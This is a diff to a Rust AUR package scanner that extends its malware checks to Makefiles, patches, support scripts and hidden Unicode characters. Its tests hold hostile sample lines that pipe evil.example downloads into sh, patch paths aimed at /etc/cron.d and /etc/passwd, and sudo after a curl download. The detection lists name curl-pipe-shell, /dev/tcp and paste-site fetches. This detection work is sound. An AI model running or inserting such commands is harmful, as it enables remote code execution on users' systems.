@@ -74,12 +74,13 @@ fn strip_trailing_comment(rest: &str) -> &str {
     let lead_ws = rest.len() - trimmed.len();
     let bytes = trimmed.as_bytes();
     if let Some(&first) = bytes.first()
-        && (first == b'\'' || first == b'"') {
-            if let Some(close_rel) = trimmed[1..].find(first as char) {
-                return &rest[..lead_ws + close_rel + 2];
-            }
-            return rest; // unterminated quote - nothing sane to cut, leave as-is
+        && (first == b'\'' || first == b'"')
+    {
+        if let Some(close_rel) = trimmed[1..].find(first as char) {
+            return &rest[..lead_ws + close_rel + 2];
         }
+        return rest; // unterminated quote - nothing sane to cut, leave as-is
+    }
     let mut prev_was_space = true; // start of the (already-trimmed) value counts as a boundary
     for (i, c) in trimmed.char_indices() {
         if c == '#' && prev_was_space {
@@ -733,9 +734,11 @@ pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
                 break;
             }
             if let Some(tok) = first_pkg_tok
-                && !tok.starts_with('.') && !tok.starts_with('/') {
-                    return true;
-                }
+                && !tok.starts_with('.')
+                && !tok.starts_with('/')
+            {
+                return true;
+            }
         }
     }
     false
@@ -1149,26 +1152,7 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "references 'compromised.txt' - the exact marker file dropped by the 2018 acroread/balz/minergate AUR takeover".to_string(),
         });
     }
-    if let Some((line, name)) = line_of_known_malicious_package(source) {
-        findings.push(Finding {
-            line,
-            severity: Severity::ConfirmedIoc,
-            message: format!(
-                "references '{}' - a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
-                name
-            ),
-        });
-    }
-    if let Some((line, hash)) = line_of_known_malicious_hash(source) {
-        findings.push(Finding {
-            line,
-            severity: Severity::ConfirmedIoc,
-            message: format!(
-                "sha256 '{}' matches a published payload hash from the openconnect-sso-anchored AUR wave (Jul/Aug 2026)",
-                hash
-            ),
-        });
-    }
+    findings.extend(known_ioc_findings(source));
     if let Some(line) = line_of_foreign_pkg_manager_install(source) {
         findings.push(Finding {
             line,
@@ -1305,6 +1289,7 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
             message: "checks TracerPid/proc-self-status or probes LD_PRELOAD/LD_LIBRARY_PATH - common anti-debugger/anti-sandbox fingerprinting".to_string(),
         });
     }
+    findings.extend(hidden_char_finding(source));
     findings
 }
 
@@ -1313,6 +1298,9 @@ pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
 /// is hidden outside PKGBUILD.
 fn scan_support_file_source(source: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
+    // `curl ... \` + `| sh` on the next line is one command to make.
+    let joined = join_continuations(source);
+    let source = joined.as_str();
     if let Some(line) = line_of_curl_pipe_shell(source) {
         findings.push(Finding {
             line,
@@ -1321,7 +1309,8 @@ fn scan_support_file_source(source: &str) -> Vec<Finding> {
                 .to_string(),
         });
     }
-    if let Some(line) = line_of_base64_pipe_shell(source) {
+    if let Some(line) = line_of_base64_pipe_shell(source).or_else(|| line_of_xxd_pipe_shell(source))
+    {
         findings.push(Finding {
             line,
             severity: Severity::Suspicious,
@@ -1387,10 +1376,136 @@ fn scan_support_file_source(source: &str) -> Vec<Finding> {
                 .to_string(),
         });
     }
+    for (check, message) in SUPPORT_LINE_CHECKS {
+        if let Some(line) = check(source) {
+            findings.push(Finding {
+                line,
+                severity: Severity::Suspicious,
+                message: (*message).to_string(),
+            });
+        }
+    }
+    findings.extend(known_ioc_findings(source));
+    findings.extend(hidden_char_finding(source));
     findings
 }
 
+type LineCheck = fn(&str) -> Option<usize>;
+
+/// Line-only checks shared with the PKGBUILD scan (same wording as there).
+const SUPPORT_LINE_CHECKS: &[(LineCheck, &str)] = &[
+    (
+        line_of_eval_remote_exec,
+        "runs `eval` on a curl/wget command substitution - executes fetched remote content without a literal pipe-into-shell to grep for",
+    ),
+    (
+        line_of_source_process_subst,
+        "sources a curl/wget process substitution (source <(curl ...)) - runs fetched remote content with neither a literal pipe nor a command substitution for the other checks to key on",
+    ),
+    (
+        line_of_python_inline_exec,
+        "python -c snippet execs/evals content inline - a python-flavored obfuscated-execution pattern",
+    ),
+    (
+        line_of_perl_inline_exec,
+        "perl -e/-E snippet with process/network control (system/exec/qx/socket/...) - same obfuscated-execution role as python -c",
+    ),
+    (
+        line_of_ruby_inline_exec,
+        "ruby -e snippet with process/network control (system/exec/%x/open-uri/...)",
+    ),
+    (
+        line_of_node_inline_exec,
+        "node -e snippet with child_process/eval/net (obfuscated execution)",
+    ),
+    (
+        line_of_lua_inline_exec,
+        "lua -e snippet with os.execute/io.popen/load (obfuscated execution)",
+    ),
+    (
+        line_of_shell_c,
+        "sh/bash -c with suspicious payload (possible obfuscated execution hidden inside -c string)",
+    ),
+    (
+        line_of_openssl_decrypt,
+        "decrypts a bundled blob with openssl (possible obfuscated payload, same role as base64 -d)",
+    ),
+    (
+        line_of_sudo_escalation,
+        "invokes sudo/pkexec/doas from inside the build - makepkg builds unprivileged on purpose, so this escalates privilege mid-build",
+    ),
+    (
+        line_of_foreign_pkg_manager_install,
+        "installs a named external package via npm/bun/yarn/pip/gem mid-build - worth a quick check that the package name is one you'd expect",
+    ),
+    (
+        line_of_decoy_tool_binary,
+        "installs an executable under a generic build-tool name (linter/hasher/minifier/validator/...) - the payload-disguise technique used across the early-August 2026 AUR wave",
+    ),
+];
+
+/// Join `\`-continued lines into the first one. The swallowed lines stay
+/// empty, so line numbers do not move.
+fn join_continuations(source: &str) -> String {
+    let mut out = String::with_capacity(source.len());
+    let mut acc = String::new();
+    let mut swallowed = 0usize;
+    for line in source.lines() {
+        let t = line.trim_end();
+        let slashes = t.chars().rev().take_while(|&c| c == '\\').count();
+        if slashes % 2 == 1 {
+            acc.push_str(&t[..t.len() - 1]);
+            acc.push(' ');
+            swallowed += 1;
+            continue;
+        }
+        acc.push_str(line);
+        out.push_str(&acc);
+        out.push('\n');
+        out.extend(std::iter::repeat_n('\n', swallowed));
+        acc.clear();
+        swallowed = 0;
+    }
+    if swallowed > 0 {
+        out.push_str(&acc);
+        out.push('\n');
+        out.extend(std::iter::repeat_n('\n', swallowed - 1));
+    }
+    out
+}
+
+/// Bidi overrides, zero-width and control characters: they make code
+/// read differently from what runs ("Trojan Source") or mangle the
+/// terminal. Tab, CR, LF and form feed (GNU sources) are fine.
+fn hidden_char(c: char) -> bool {
+    matches!(
+        c,
+        '\u{202A}'..='\u{202E}'
+            | '\u{2066}'..='\u{2069}'
+            | '\u{200B}'..='\u{200F}'
+            | '\u{2060}'
+            | '\u{FEFF}'
+    ) || (c.is_control() && !matches!(c, '\t' | '\n' | '\r' | '\u{0C}'))
+}
+
+pub(crate) fn line_of_hidden_chars(source: &str) -> Option<usize> {
+    // A BOM at the very start is harmless.
+    let s = source.strip_prefix('\u{FEFF}').unwrap_or(source);
+    s.lines()
+        .position(|l| l.chars().any(hidden_char))
+        .map(|i| i + 1)
+}
+
+fn hidden_char_finding(source: &str) -> Option<Finding> {
+    line_of_hidden_chars(source).map(|line| Finding {
+        line,
+        severity: Severity::Suspicious,
+        message: "contains invisible/bidirectional-control or non-printable characters - the code can read differently from what actually runs (Trojan Source)".to_string(),
+    })
+}
+
 /// PKGBUILD appears to invoke make/gmake (including $(MAKE)).
+#[cfg_attr(not(test), allow(dead_code))]
 fn pkgbuild_invokes_make(pkgbuild: &str) -> bool {
     for line in pkgbuild.lines() {
         let t = line.trim();
@@ -1424,21 +1539,20 @@ fn pkgbuild_shell_script_refs(pkgbuild: &str) -> Vec<String> {
         let parts: Vec<&str> = t.split_whitespace().collect();
         for (i, w) in parts.iter().enumerate() {
             let shell = matches!(*w, "bash" | "sh" | "dash" | "zsh" | "fish" | "ksh" | "ash");
-            if shell
-                && let Some(next) = parts.get(i + 1) {
-                    // Skip flags like -c, -e.
-                    if next.starts_with('-') {
-                        continue;
-                    }
-                    let path = next.trim_matches(|c| c == '"' || c == '\'' || c == '`');
-                    if !path.is_empty()
-                        && !path.contains("://")
-                        && !path.starts_with('$')
-                        && !path.contains('=')
-                    {
-                        out.push(path.to_string());
-                    }
+            if shell && let Some(next) = parts.get(i + 1) {
+                // Skip flags like -c, -e.
+                if next.starts_with('-') {
+                    continue;
                 }
+                let path = next.trim_matches(|c| c == '"' || c == '\'' || c == '`');
+                if !path.is_empty()
+                    && !path.contains("://")
+                    && !path.starts_with('$')
+                    && !path.contains('=')
+                {
+                    out.push(path.to_string());
+                }
+            }
             // `./something.sh` or `path/to/script.sh`
             if (w.starts_with("./") || w.contains('/'))
                 && (w.ends_with(".sh")
@@ -1456,28 +1570,402 @@ fn pkgbuild_shell_script_refs(pkgbuild: &str) -> Vec<String> {
     out
 }
 
-/// When the checkout is local: scan Makefile* if present (or PKGBUILD
-/// clearly invokes make), and shell scripts it references.
-/// Returns (filename, findings).
-fn scan_local_support_files(pkgbuild: &str, dir: &std::path::Path) -> Vec<(String, Finding)> {
-    let mut out = Vec::new();
-    // Always try Makefile* on disk: PKGBUILD may call `$(MAKE)`, a
-    // variable, or `make` only after an edit the invoke-heuristic misses.
-    let want_make = pkgbuild_invokes_make(pkgbuild)
-        || ["Makefile", "makefile", "GNUmakefile"]
-            .iter()
-            .any(|n| dir.join(n).is_file());
-    if want_make {
-        for name in ["Makefile", "makefile", "GNUmakefile"] {
-            let path = dir.join(name);
-            if let Ok(src) = std::fs::read_to_string(&path) {
-                for f in scan_support_file_source(&src) {
-                    out.push((name.to_string(), f));
+/// Exact campaign matches (package name, payload hash): low false-positive.
+fn known_ioc_findings(source: &str) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    if let Some((line, name)) = line_of_known_malicious_package(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::ConfirmedIoc,
+            message: format!(
+                "references '{}' - a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
+                name
+            ),
+        });
+    }
+    if let Some((line, hash)) = line_of_known_malicious_hash(source) {
+        findings.push(Finding {
+            line,
+            severity: Severity::ConfirmedIoc,
+            message: format!(
+                "sha256 '{}' matches a published payload hash from the openconnect-sso-anchored AUR wave (Jul/Aug 2026)",
+                hash
+            ),
+        });
+    }
+    findings
+}
+
+// ── patch files ──────────────────────────────────────────────────────────────
+
+/// Checks that are safe on any added line, whatever file the patch edits.
+const PATCH_STRONG_CHECKS: &[(LineCheck, &str)] = &[
+    (
+        line_of_curl_pipe_shell,
+        "downloads and pipes a remote script straight into a shell (curl/wget | sh)",
+    ),
+    (
+        line_of_base64_pipe_shell,
+        "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash)",
+    ),
+    (
+        line_of_xxd_pipe_shell,
+        "decodes a base64/hex-encoded blob and pipes it straight into a shell (base64 -d | sh / xxd -r -p | bash)",
+    ),
+    (
+        line_of_eval_remote_exec,
+        "runs `eval` on a curl/wget command substitution - executes fetched remote content without a literal pipe-into-shell to grep for",
+    ),
+    (
+        line_of_source_process_subst,
+        "sources a curl/wget process substitution (source <(curl ...)) - runs fetched remote content with neither a literal pipe nor a command substitution for the other checks to key on",
+    ),
+    (
+        line_of_paste_site_fetch,
+        "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...)",
+    ),
+    (line_of_onion_address, "references a .onion address"),
+    (
+        line_of_compromised_marker,
+        "references 'compromised.txt' - marker from the 2018 AUR takeover",
+    ),
+];
+
+/// Long enough to hide a payload past the edge of a review window.
+const PATCH_LONG_LINE: usize = 4000;
+
+/// Path from a `---` / `+++` header: no timestamp, no quotes.
+fn patch_header_path(s: &str) -> &str {
+    s.split('\t').next().unwrap_or(s).trim().trim_matches('"')
+}
+
+/// Absolute, `..` or `.git` paths: not where a source patch belongs.
+fn unsafe_patch_path(p: &str) -> bool {
+    p != "/dev/null" && (p.starts_with('/') || p.split('/').any(|c| c == ".." || c == ".git"))
+}
+
+/// Files the build runs: a network call added there is worth a look.
+fn is_build_file(path: &str) -> bool {
+    let base = path.rsplit('/').next().unwrap_or(path).to_ascii_lowercase();
+    matches!(
+        base.as_str(),
+        "makefile"
+            | "gnumakefile"
+            | "cmakelists.txt"
+            | "configure"
+            | "configure.ac"
+            | "build.rs"
+            | "setup.py"
+            | "pyproject.toml"
+            | "package.json"
+            | "meson.build"
+            | "build.gradle"
+    ) || [".mk", ".sh", ".cmake"].iter().any(|e| base.ends_with(e))
+}
+
+fn looks_like_patch(text: &str) -> bool {
+    let mut prev_minus = false;
+    for l in text.lines().take(200) {
+        if l.starts_with("diff --git ") || l.starts_with("Index: ") {
+            return true;
+        }
+        if prev_minus && l.starts_with("+++ ") {
+            return true;
+        }
+        prev_minus = l.starts_with("--- ");
+    }
+    false
+}
+
+/// Only the added lines of a patch are code, so they get the IOC scan;
+/// the headers get the checks `patch` / `git apply` need from a reader.
+/// Line numbers are the patch's own.
+fn scan_patch_source(text: &str) -> Vec<Finding> {
+    let mut all = String::new(); // added lines, the rest blank
+    let mut build = String::new(); // same, only for build/script targets
+    let mut in_build = false;
+    let mut prev = "";
+    let (mut bad_path, mut symlink, mut binary, mut long, mut net) = (None, None, None, None, None);
+
+    for (i, line) in text.lines().enumerate() {
+        let n = i + 1;
+        let mut added = "";
+        if let Some(rest) = line
+            .strip_prefix("+++ ")
+            .filter(|_| prev.starts_with("--- "))
+        {
+            let new = patch_header_path(rest);
+            let old = patch_header_path(&prev[4..]);
+            if bad_path.is_none() && (unsafe_patch_path(old) || unsafe_patch_path(new)) {
+                bad_path = Some(n);
+            }
+            in_build = is_build_file(new);
+        } else if let Some(a) = line.strip_prefix('+') {
+            added = a;
+            if long.is_none() && a.len() > PATCH_LONG_LINE {
+                long = Some(n);
+            }
+            if net.is_none() && in_build {
+                let l = a.to_ascii_lowercase();
+                if l.contains("curl ") || l.contains("wget ") || l.contains("/dev/tcp/") {
+                    net = Some(n);
                 }
+            }
+        } else if line.starts_with("diff --git ") {
+            in_build = false;
+        } else if let Some(p) = line
+            .strip_prefix("rename to ")
+            .or_else(|| line.strip_prefix("copy to "))
+        {
+            if bad_path.is_none() && unsafe_patch_path(patch_header_path(p)) {
+                bad_path = Some(n);
+            }
+        } else if line.starts_with("new file mode 120000") || line.starts_with("new mode 120000") {
+            symlink.get_or_insert(n);
+        } else if line.starts_with("GIT binary patch")
+            || (line.starts_with("Binary files ") && line.ends_with(" differ"))
+        {
+            binary.get_or_insert(n);
+        }
+        all.push_str(added);
+        all.push('\n');
+        if in_build {
+            build.push_str(added);
+        }
+        build.push('\n');
+        prev = line;
+    }
+
+    let mut findings = Vec::new();
+    let mut flag = |line: Option<usize>, message: &str| {
+        if let Some(line) = line {
+            findings.push(Finding {
+                line,
+                severity: Severity::Suspicious,
+                message: message.to_string(),
+            });
+        }
+    };
+    flag(
+        bad_path,
+        "patch names a path outside the source tree (absolute, `..` or `.git`) - patch/git apply can be made to write there",
+    );
+    flag(
+        symlink,
+        "patch creates a symlink - a later hunk can write through it, outside the source tree",
+    );
+    flag(
+        binary,
+        "binary hunk in a patch - its content cannot be reviewed as text",
+    );
+    flag(
+        long,
+        "added line over 4000 characters - long lines hide payloads from review",
+    );
+    flag(
+        net,
+        "patch adds a curl, wget or /dev/tcp call to a build or script file",
+    );
+    for (check, message) in PATCH_STRONG_CHECKS {
+        flag(check(&all), message);
+    }
+    findings.extend(known_ioc_findings(&all));
+    findings.extend(hidden_char_finding(text));
+    // Build and script targets get the whole line scan; skip repeats.
+    for f in scan_support_file_source(&build) {
+        if !findings.iter().any(|x| x.message == f.message) {
+            findings.push(f);
+        }
+    }
+    findings
+}
+
+// ── support files in the package directory ──────────────────────────────────
+
+/// Largest support file read for the scan / most files looked at / most
+/// bytes read in all.
+const SUPPORT_MAX_BYTES: u64 = 2 * 1024 * 1024;
+const SUPPORT_MAX_FILES: usize = 200;
+const SUPPORT_MAX_TOTAL: u64 = 32 * 1024 * 1024;
+
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum SupportKind {
+    Make,
+    Patch,
+    Shell,
+    /// Python/hook/service/...: line scan only.
+    Other,
+}
+
+/// What a file in the package directory is. `text` may be empty: then
+/// only the name decides.
+fn classify_support(name: &str, text: &str) -> Option<SupportKind> {
+    let base = name.rsplit('/').next().unwrap_or(name).to_ascii_lowercase();
+    let ext = base.rsplit_once('.').map_or("", |(_, e)| e);
+    if matches!(base.as_str(), "makefile" | "gnumakefile") || matches!(ext, "mk" | "make") {
+        return Some(SupportKind::Make);
+    }
+    if matches!(ext, "patch" | "diff" | "dpatch" | "pch") || looks_like_patch(text) {
+        return Some(SupportKind::Patch);
+    }
+    if matches!(ext, "sh" | "bash" | "zsh" | "fish" | "ksh" | "install") {
+        return Some(SupportKind::Shell);
+    }
+    if matches!(ext, "hook" | "service" | "timer") {
+        return Some(SupportKind::Other);
+    }
+    let first = text.lines().next().filter(|l| l.starts_with("#!"))?;
+    let mut toks = first[2..].split_whitespace();
+    let mut interp = toks.next()?.rsplit('/').next()?;
+    if interp == "env" {
+        interp = toks.find(|t| !t.starts_with('-'))?.rsplit('/').next()?;
+    }
+    match interp {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" => Some(SupportKind::Shell),
+        i if ["python", "perl", "ruby", "node", "lua"]
+            .iter()
+            .any(|p| i.starts_with(p)) =>
+        {
+            Some(SupportKind::Other)
+        }
+        _ => None,
+    }
+}
+
+/// Control characters in a name must not reach the terminal.
+fn display_name(s: &str) -> String {
+    s.chars()
+        .map(|c| if hidden_char(c) { '?' } else { c })
+        .collect()
+}
+
+/// Regular files two levels deep (no `.git`), plus findings for
+/// symlinks that leave the directory. Labels are display-safe.
+fn walk_support_dir(
+    root: &std::path::Path,
+) -> (Vec<(String, std::path::PathBuf)>, Vec<(String, Finding)>) {
+    let mut files = Vec::new();
+    let mut notes = Vec::new();
+    let mut stack = vec![(root.to_path_buf(), String::new(), 0usize)];
+    while let Some((dir, prefix, depth)) = stack.pop() {
+        let Ok(rd) = std::fs::read_dir(&dir) else {
+            continue;
+        };
+        let mut entries: Vec<_> = rd.flatten().collect();
+        entries.sort_by_key(|e| e.file_name());
+        for e in entries {
+            if files.len() >= SUPPORT_MAX_FILES {
+                return (files, notes);
+            }
+            let name = e.file_name().to_string_lossy().into_owned();
+            let label = if prefix.is_empty() {
+                display_name(&name)
+            } else {
+                format!("{}/{}", prefix, display_name(&name))
+            };
+            let Ok(md) = std::fs::symlink_metadata(e.path()) else {
+                continue;
+            };
+            let ft = md.file_type();
+            if ft.is_symlink() {
+                if let Ok(t) = std::fs::read_link(e.path()) {
+                    let t = t.to_string_lossy().into_owned();
+                    if t.starts_with('/') || t.split('/').any(|c| c == "..") {
+                        notes.push((
+                            label,
+                            Finding {
+                                line: 0,
+                                severity: Severity::Suspicious,
+                                message: format!(
+                                    "symlink pointing outside the package directory ({})",
+                                    display_name(&t)
+                                ),
+                            },
+                        ));
+                    }
+                }
+            } else if ft.is_dir() {
+                if name != ".git" && depth < 2 {
+                    stack.push((e.path(), label, depth + 1));
+                }
+            } else if ft.is_file() {
+                files.push((label, e.path()));
             }
         }
     }
+    (files, notes)
+}
+
+/// When the checkout is local: scan every Makefile, patch and script in
+/// the package directory (whether or not the PKGBUILD names them), plus
+/// the scripts it references. Returns (filename, finding).
+fn scan_local_support_files(pkgbuild: &str, dir: &std::path::Path) -> Vec<(String, Finding)> {
+    let mut out = Vec::new();
+    let install = resolve_install_filename(pkgbuild);
+    let (files, notes) = walk_support_dir(dir);
+    out.extend(notes);
+
+    let mut done: std::collections::HashSet<String> = std::collections::HashSet::new();
+    let mut total = 0u64;
+    for (rel, path) in files {
+        // Scanned on their own already.
+        if rel == "PKGBUILD" || rel == ".SRCINFO" || install.as_deref() == Some(rel.as_str()) {
+            continue;
+        }
+        let Ok(md) = std::fs::symlink_metadata(&path) else {
+            continue;
+        };
+        if md.len() > SUPPORT_MAX_BYTES {
+            if classify_support(&rel, "").is_some() {
+                out.push((
+                    rel.clone(),
+                    Finding {
+                        line: 0,
+                        severity: Severity::Suspicious,
+                        message: format!("{} bytes - too large to scan, read it by hand", md.len()),
+                    },
+                ));
+            }
+            continue;
+        }
+        total += md.len();
+        if total > SUPPORT_MAX_TOTAL {
+            break;
+        }
+        let Ok(bytes) = std::fs::read(&path) else {
+            continue;
+        };
+        // Invalid UTF-8 must not hide a file from the scan.
+        let invalid = std::str::from_utf8(&bytes).is_err();
+        let text = String::from_utf8_lossy(&bytes);
+        let Some(kind) = classify_support(&rel, &text) else {
+            continue;
+        };
+        let findings = match kind {
+            SupportKind::Make | SupportKind::Other => scan_support_file_source(&text),
+            SupportKind::Patch => scan_patch_source(&text),
+            SupportKind::Shell => scan_pkgbuild_source(&text),
+        };
+        if invalid && kind != SupportKind::Patch {
+            out.push((
+                rel.clone(),
+                Finding {
+                    line: 0,
+                    severity: Severity::Suspicious,
+                    message:
+                        "not valid UTF-8 - a text file with stray binary bytes; read it by hand"
+                            .to_string(),
+                },
+            ));
+        }
+        out.extend(findings.into_iter().map(|f| (rel.clone(), f)));
+        done.insert(rel);
+    }
+
     for rel in pkgbuild_shell_script_refs(pkgbuild) {
+        if done.contains(rel.trim_start_matches("./")) {
+            continue;
+        }
         // Only paths that stay under the package dir (no ../ escapes).
         let path = dir.join(&rel);
         let Ok(canon) = path.canonicalize() else {
@@ -1489,10 +1977,11 @@ fn scan_local_support_files(pkgbuild: &str, dir: &std::path::Path) -> Vec<(Strin
         if !canon.starts_with(&dir_canon) {
             continue;
         }
-        if let Ok(src) = std::fs::read_to_string(&canon) {
+        if let Ok(bytes) = std::fs::read(&canon) {
+            let src = String::from_utf8_lossy(&bytes);
             // Full PKGBUILD-grade scan for real shell scripts.
             for f in scan_pkgbuild_source(&src) {
-                out.push((rel.clone(), f));
+                out.push((display_name(&rel), f));
             }
         }
     }
@@ -2006,7 +2495,7 @@ pub(crate) fn print_finding_block(
     }
 }
 
-// ── Pre-`pacman -U` audit of a built `*.pkg.tar.*` ───────────────────────────
+// ── Pre-`-U` audit of a built `*.pkg.tar.*` ───────────────────────────
 //
 // The static PKGBUILD scanner cannot predict what `package()` will put
 // into the archive. Whatever ends up installed runs as root (`.INSTALL`
@@ -2127,7 +2616,7 @@ fn extract_install_script(path: &std::path::Path) -> Option<String> {
     String::from_utf8(out.stdout).ok()
 }
 
-/// Audit every built tarball before `pacman -U`. Prints findings; when
+/// Audit every built tarball before `-U`. Prints findings; when
 /// `force_prompt` is true (interactive ask paths) requires `y` to
 /// continue. With `--noconfirm` only warns and continues.
 ///
@@ -2196,7 +2685,7 @@ pub(crate) fn audit_built_packages(tarballs: &[String], force_prompt: bool) -> b
     }
     crate::progress::status_break();
     eprint!(
-        "{} Built package contains privileged paths/scripts. Continue with pacman -U? [y/N] ",
+        "{} Built package contains privileged paths/scripts. Continue with -U? [y/N] ",
         ">>>".t_yellow().bold()
     );
     let _ = io::stderr().flush();
@@ -2290,12 +2779,16 @@ build() {
 }
 "#;
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("base64/hex-encoded blob")));
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("process substitution")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("base64/hex-encoded blob"))
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("process substitution"))
+        );
     }
 
     #[test]
@@ -2387,6 +2880,129 @@ package() {
     }
 
     #[test]
+    fn continued_makefile_line_is_one_command() {
+        let mf = "all:\n\tcurl -sSL http://evil.example/p \\\n\t  | sh\n\techo done\n";
+        let hits = scan_support_file_source(mf);
+        let h = hits.iter().find(|f| f.message.contains("pipes a remote"));
+        assert_eq!(h.map(|f| f.line), Some(2));
+        // numbering does not move for what follows
+        assert_eq!(join_continuations(mf).lines().count(), mf.lines().count());
+    }
+
+    #[test]
+    fn support_scan_has_the_pkgbuild_checks() {
+        let mf = "all:\n\tpython3 -c \"import os; os.system('id')\"\n\tsudo ./validator --setup\n";
+        let hits = scan_support_file_source(mf);
+        assert!(hits.iter().any(|f| f.message.contains("python -c")));
+        assert!(hits.iter().any(|f| f.message.contains("sudo/pkexec/doas")));
+    }
+
+    #[test]
+    fn hidden_characters_are_flagged() {
+        assert_eq!(line_of_hidden_chars("ok\nx\u{202E}y\n"), Some(2));
+        assert_eq!(line_of_hidden_chars("a\u{200B}b"), Some(1));
+        assert_eq!(line_of_hidden_chars("a\x1b[2Jb"), Some(1));
+        assert_eq!(line_of_hidden_chars("\u{FEFF}all:\n\ttab\r\n\x0c\n"), None);
+    }
+
+    #[test]
+    fn benign_patch_is_clean() {
+        let p = "--- a/foo.c\n+++ b/foo.c\n@@ -1,2 +1,3 @@\n int main() {\n+  puts(\"hi\");\n   return 0;\n";
+        assert!(scan_patch_source(p).is_empty());
+        assert!(looks_like_patch(p));
+    }
+
+    #[test]
+    fn patch_adding_curl_pipe_shell_is_flagged_on_added_lines_only() {
+        let bad = "--- a/foo.c\n+++ b/foo.c\n@@ -1 +1,2 @@\n+// curl -s http://evil.example/x | sh\n int x;\n";
+        let hits = scan_patch_source(bad);
+        assert!(
+            hits.iter()
+                .any(|f| f.line == 4 && f.message.contains("pipes a remote"))
+        );
+        // the same text as removed/context lines is not code
+        let gone = "--- a/foo.c\n+++ b/foo.c\n@@ -1,2 +1 @@\n-curl -s http://evil.example/x | sh\n int x;\n";
+        assert!(scan_patch_source(gone).is_empty());
+    }
+
+    #[test]
+    fn patch_headers_are_checked() {
+        let esc = "--- a/x\n+++ ../../etc/cron.d/x\n@@ -0,0 +1 @@\n+x\n";
+        assert!(
+            scan_patch_source(esc)
+                .iter()
+                .any(|f| f.message.contains("outside the source tree"))
+        );
+        let abs = "diff --git a/x b/x\nrename to /etc/passwd\n";
+        assert!(
+            scan_patch_source(abs)
+                .iter()
+                .any(|f| f.message.contains("outside the source tree"))
+        );
+        let link = "diff --git a/l b/l\nnew file mode 120000\n";
+        assert!(
+            scan_patch_source(link)
+                .iter()
+                .any(|f| f.message.contains("symlink"))
+        );
+        let bin = "diff --git a/b b/b\nGIT binary patch\nliteral 3\n";
+        assert!(
+            scan_patch_source(bin)
+                .iter()
+                .any(|f| f.message.contains("binary hunk"))
+        );
+        let ok = "--- a/x\t2024-01-01\n+++ b/x\t2024-01-02\n@@ -1 +1 @@\n-a\n+b\n";
+        assert!(scan_patch_source(ok).is_empty());
+    }
+
+    #[test]
+    fn patch_to_a_build_file_gets_the_full_scan() {
+        let p = "--- a/Makefile\n+++ b/Makefile\n@@ -1 +1,2 @@\n+\tcurl -sSL http://x.example/a -o a\n+\tsudo ./a\n all:\n";
+        let hits = scan_patch_source(p);
+        assert!(hits.iter().any(|f| f.message.contains("patch adds a curl")));
+        assert!(hits.iter().any(|f| f.message.contains("sudo/pkexec/doas")));
+        // sudo in plain source is not a finding
+        let c = "--- a/x.c\n+++ b/x.c\n@@ -1 +1,2 @@\n+  run(\"sudo \");\n int x;\n";
+        assert!(scan_patch_source(c).is_empty());
+    }
+
+    #[test]
+    fn local_dir_scans_patches_scripts_and_odd_bytes() {
+        let dir = std::env::temp_dir().join(format!("ae-sup-scan-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join("PKGBUILD"), "pkgname=x\nbuild() { true; }\n").unwrap();
+        std::fs::write(
+            dir.join("fix.patch"),
+            "--- a/Makefile\n+++ b/Makefile\n@@ -1 +1,2 @@\n+\tcurl -sSL https://evil.example.com/x | sh\n all:\n",
+        )
+        .unwrap();
+        // not named in the PKGBUILD, no extension: found by its shebang
+        std::fs::write(
+            dir.join("helper"),
+            "#!/bin/sh\ncurl -sSL https://evil.example.com/y | sh\n",
+        )
+        .unwrap();
+        // invalid UTF-8 must not skip the file
+        std::fs::write(
+            dir.join("Makefile"),
+            b"all:\n\tcurl -sSL https://evil.example.com/z | sh\n\xff\xfe\n".as_slice(),
+        )
+        .unwrap();
+        let pb = std::fs::read_to_string(dir.join("PKGBUILD")).unwrap();
+        let hits = scan_local_support_files(&pb, &dir);
+        let has = |file: &str, what: &str| {
+            hits.iter()
+                .any(|(f, x)| f == file && x.message.contains(what))
+        };
+        assert!(has("fix.patch", "pipes a remote"), "{:?}", hits);
+        assert!(has("helper", "pipes a remote"), "{:?}", hits);
+        assert!(has("Makefile", "pipes a remote"), "{:?}", hits);
+        assert!(has("Makefile", "not valid UTF-8"), "{:?}", hits);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
     fn top_level_command_substitution_flagged_in_full_scan() {
         // the real repro: a markdown code-span backtick left in pkgdesc,
         // pasted from a GitHub README - runs the literal command `bwrap`
@@ -2394,9 +3010,11 @@ package() {
         // build() or the sandbox are anywhere in the picture.
         let pkgbuild = "pkgname=aura-emerge\npkgver=2.1.4\npkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgrel=1\n";
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("command substitution")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("command substitution"))
+        );
 
         // same construct inside a function body (only runs when makepkg
         // actually calls that function) must NOT flag.
@@ -2438,9 +3056,11 @@ package() {
     fn sandbox_evasion_flagged_in_full_scan() {
         let src = "pkgname=foo\nbuild() {\n  if grep -q TracerPid /proc/self/status; then\n    return 0\n  fi\n  do_real_payload\n}\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("TracerPid") || f.message.contains("anti-debugger")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("TracerPid") || f.message.contains("anti-debugger"))
+        );
     }
 
     #[test]
